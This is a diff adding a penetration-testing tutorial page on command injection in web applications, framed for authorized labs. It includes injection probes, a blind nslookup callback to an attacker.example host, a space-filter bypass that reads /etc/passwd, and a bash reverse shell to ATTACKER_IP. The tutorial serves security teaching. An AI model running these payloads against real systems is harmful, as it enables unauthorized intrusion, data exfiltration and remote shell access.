@@ -1,0 +1,177 @@
+---
+title: Command Injection
+description: Command injection testing — where it hides, separators and syntax, blind vs output-based detection, filters, and how command execution becomes initial access in authorized labs.
+section: web
+phase: 3
+order: 9
+difficulty: intermediate
+draft: false
+tags: ['command-injection', 'rce', 'os-command', 'blind', 'separators']
+updated: 2026-08-08
+---
+
+import Alert from '../../../components/ui/Alert.astro';
+import Badge from '../../../components/ui/Badge.astro';
+import CodeBlock from '../../../components/ui/CodeBlock.astro';
+import SourceTag from '../../../components/ui/SourceTag.astro';
+
+## What command injection is
+
+Some applications pass user input to the operating system's shell — for example, a "ping a host" or "convert a file" feature that builds a shell command. Command injection happens when your input is interpreted as part of that command instead of as data.
+
+<CodeBlock
+  lang="text"
+  title="Vulnerable pattern"
+  code={`App code (conceptually):
+  system("ping -c 4 " . $target)
+
+Your input:  10.10.10.42; id
+
+Command that runs:
+  ping -c 4 10.10.10.42; id
+                          ^ runs after ping
+`}
+/>
+
+**Why it matters:** it is full operating-system command execution — the strongest class of web finding, and a direct path to [initial access](/guides/web/web-shells-initial-access).
+
+## Where it commonly appears
+
+Features that hand input to the shell:
+
+- Ping / traceroute / DNS lookup tools.
+- File converters (PDF, image processing).
+- Archive tools (zip/unzip).
+- Network diagnostic pages.
+- Anything accepting a hostname, IP, filename, or URL and "processing" it server-side.
+
+## Input identification
+
+Look for parameters whose value sounds like something a shell might consume: `host=`, `ip=`, `domain=`, `file=`, `url=`, `ping=`, `cmd=`. The tell is a parameter that drives an action, not just a lookup.
+
+## Basic testing methodology
+
+### 1. Send a harmless separator
+
+<CodeBlock
+  lang="text"
+  title="Separator probes (authorized lab)"
+  code={`?host=10.10.10.42; id
+?host=10.10.10.42 | id
+?host=10.10.10.42 && id
+?host=10.10.10.42 || id
+?host=$(id)
+?host=\`id\`
+`}
+/>
+
+- **Purpose:** determine whether input reaches a shell and how commands chain.
+- **Expected result:** command output (user/uid) appears in the response.
+- **Investigate next:** confirm with a second, independent command and note which separators work.
+
+### 2. Read the response carefully
+
+- **Visible output** — the command's output is rendered. Fast to confirm.
+- **Output in a different place** — the command ran but output goes to a file/log or an email. Test blind.
+- **No output at all** — likely blind; use timing or out-of-band checks.
+
+## Blind command injection
+
+When nothing comes back, prove execution without visible output:
+
+<CodeBlock
+  lang="text"
+  title="Time-based blind probe"
+  code={`?host=10.10.10.42; sleep 5
+?host=10.10.10.42 && sleep 5
+   -> measure the response time against a baseline request
+`}
+/>
+
+- **Purpose:** confirm command execution when output is hidden.
+- **Expected result:** the page takes ~5 seconds longer than baseline.
+- **Investigate next:** turn timing into a data channel (sleep length = one byte) or use out-of-band.
+
+<CodeBlock
+  lang="text"
+  title="Out-of-band proof"
+  code={`?host=10.10.10.42; nslookup MARKER.attacker.example
+   -> your DNS server sees a lookup for MARKER.attacker.example
+   (run your own listener/DNS server in the lab)
+`}
+/>
+
+- **Purpose:** a reliable proof of execution that does not depend on response content.
+- **Expected result:** the query arrives at your controlled server.
+- **Investigate next:** use the same channel to exfiltrate small payloads.
+
+## Separators reference
+
+| Separator | Meaning |
+|---|---|
+| `;` | Run regardless of previous result |
+| `&&` | Run only if previous succeeded |
+| `\|\|` | Run only if previous failed |
+| `\|` | Send output of the first command into the second |
+| `` `cmd` `` / `$(cmd)` | Command substitution |
+
+<Alert variant="info" title="Which one to try first">
+  A bare `;` is the most common and simplest. If the app validates the input, each separator has a different bypass history, so try the whole set and also URL-encode characters (`%3B`, `%26`).
+</Alert>
+
+## Output vs blind execution
+
+- **Output-based** — the response shows results; iterate quickly to a shell.
+- **Blind** — no output; prefer timing for confirmation and DNS for proof, then hand the task to a listener-based reverse shell rather than trying to read data through the blind channel.
+
+## Validation and filtering concepts
+
+Real apps filter. Test around the filter rather than through it:
+
+- **Whitelist on allowed values** — the `ping` feature may only accept IPs; a URL-encoded or alternate-encoding hostname may still reach the shell.
+- **Blacklist on characters** — `;`, `|`, `&` blocked; try newlines, backticks, `$()`.
+- **Filter on spaces** — use `${IFS}` (classic bash trick) where allowed.
+- **Filter on commands** — obfuscate (`/bin/cat` vs `cat`, `pwd` vs `$(which)` loops) — but keep obfuscation relevant to a real bypass, not random noise.
+
+<CodeBlock
+  lang="text"
+  title="Space-filter bypass example"
+  code={`?host=10.10.10.42;cat\${IFS}/etc/passwd
+`}
+/>
+
+## From command injection to initial access
+
+Once you can run commands, you want a stable shell rather than one command at a time:
+
+<CodeBlock
+  lang="text"
+  title="Concept: reverse shell (lab only)"
+  code={`?host=10.10.10.42; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+   -> your listener (nc -lvnp 4444) gets an interactive shell
+`}
+/>
+
+- **Purpose:** move from single-command execution to an interactive session.
+- **Expected result:** a shell on your listener.
+- **Investigate next:** [stabilize the shell](/guides/web/web-shells-initial-access), then continue toward [privilege escalation](/roadmap#phase-5).
+
+<Alert variant="danger" title="Scope and safety">
+  Reverse shells connect to *your* machine — the attacker machine you own in the lab. Never attempt this outside authorized targets, and never run payloads that damage the target environment.
+</Alert>
+
+## Common mistakes
+
+- **Only trying `;`** when the app blocks it — test the full separator set.
+- **Stopping when there is no visible output** — blind injection is still command injection.
+- **Not measuring a baseline** before trusting a `sleep 5` result (slow is not proof).
+- **Ignoring filters** and assuming a blacklisted character means "not injectable".
+- **Forgetting that spaces get filtered** and giving up at `?cmd=cat /etc/passwd`.
+- **Jumping to a reverse shell** without first confirming command execution with `id`.
+
+## Related guides
+
+- [Web Shells & Initial Access](/guides/web/web-shells-initial-access) — turning execution into a session.
+- [File Upload Vulnerabilities](/guides/web/file-upload-vulnerabilities) — a different route to the same goal.
+- [SQL Injection](/guides/web/sql-injection) — same "input reaches a powerful sink" reasoning.
+- [Web Exploitation Methodology](/guides/web/web-exploitation-methodology) — where command execution sits in the flow.
